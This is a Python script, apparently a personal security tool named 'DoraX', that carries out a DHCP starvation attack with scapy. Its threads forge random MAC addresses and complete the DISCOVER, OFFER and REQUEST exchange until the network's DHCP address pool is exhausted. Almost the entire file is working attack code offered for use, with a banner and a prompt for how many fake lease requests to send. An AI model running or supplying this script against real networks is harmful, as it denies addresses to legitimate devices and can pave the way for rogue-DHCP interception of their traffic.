from scapy.all import *
import time
import random
from concurrent.futures import ThreadPoolExecutor

def banner():
    CYAN = "\033[96m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    RESET = "\033[0m"
    print(RED + r"""
        ██████╗  ██████╗ ██████╗  █████╗ ██╗  ██╗
        ██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚██╗██╔╝
        ██║  ██║██║   ██║██████╔╝███████║ ╚███╔╝ 
        ██║  ██║██║   ██║██╔══██╗██╔══██║ ██╔██╗ 
        ██████╔╝╚██████╔╝██║  ██║██║  ██║██╔╝ ██╗
        ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
         """ + RESET)
    print(GREEN + "DoraX – DHCP Starvation Tool" + RESET)
    print(CYAN + "Developer : Ahmed Mohamed AKA : X_ByteBandit_X" + RESET)
    print("Version   : 1.0\n")

banner()
# Specify The Interface of the NIC as the src of the packet
iface = "eth0" # Change This

# Drop the device ip inorder to send 0.0.0.0 to the DHCP
conf.checkIPaddr = False 

def pkt_proccessing(thread_index):
    # --- THREAD-LOCAL IDENTITY ---
    # Everything inside here is unique to this specific thread
    local_mac = str(RandMAC())
    local_mac_bytes = bytes.fromhex(local_mac.replace(":", ""))
    local_xid = random.getrandbits(32)
    
    # This inner function handles sniffing for this specific thread's XID
    def thread_callback(pkt):
        if pkt.haslayer(DHCP):
            opts = pkt[DHCP].options
            msg_type = next((opt[1] for opt in opts if opt[0] == "message-type"), None)
            
            # 1. Catch OFFER for our specific XID
            if msg_type == 2 and pkt[BOOTP].xid == local_xid:
                offered_ip = pkt[BOOTP].yiaddr
                server_ip = pkt[IP].src
                print(f"[Thread {thread_index}] [+] OFFER: {offered_ip}")
                
                # Create Request
                request = (
                    Ether(dst="ff:ff:ff:ff:ff:ff", src=local_mac) /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=local_mac_bytes + b"\x00"*10, xid=local_xid, flags=0x8000) /
                    DHCP(options=[
                        ("message-type", "request"),
                        ("server_id", server_ip),
                        ("requested_addr", offered_ip),
                        ("client_id", b"\x01" + local_mac_bytes),
                        "end"
                    ])
                )
                sendp(request, iface=iface, verbose=False)

            # 3. Catch ACK for our specific XID
            elif msg_type == 5 and pkt[BOOTP].xid == local_xid:
                print(f"[Thread {thread_index}] [!] ACK: {pkt[BOOTP].yiaddr} assigned to {local_mac}")
                return True # Stop sniffer for this thread

   
    sniffer = AsyncSniffer(iface=iface, filter="udp and port 68", stop_filter=thread_callback)
    sniffer.start()
    
    #  prevent all threads going in the wire at the exact microsecond
    time.sleep(random.uniform(0.1, 0.5))

    # Build DISCOVER
    discover = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=local_mac) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=local_mac_bytes + b"\x00"*10, xid=local_xid, flags=0x8000) /
        DHCP(options=[
            ("message-type", "discover"),
            ("client_id", b"\x01" + local_mac_bytes),
            ("param_req_list", [1, 3, 6]),
            "end"
        ])
    )
    
    # Send Discover
    sendp(discover, iface=iface, verbose=False)

    # Wait for completion or timeout
    start_time = time.time()
    while sniffer.running and (time.time() - start_time) < 8:
        time.sleep(0.2)
    
    if sniffer.running:
        sniffer.stop()
        # print(f"[Thread {thread_index}] [X] Timeout")

# Main Execution
try:
    num = int(input("Enter Number of Starvation Requests: "))
except ValueError:
    print('Invalid Input.')
    exit()

start_time = time.time()

print(f"[*] Launching {num} threads...")


with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(pkt_proccessing, range(num))

print("\n[*] Starvation attempt complete. Check your DHCP Server leases.")
total_time = time.time() - start_time
print(f"Execution Time : {round(total_time,1)}s")

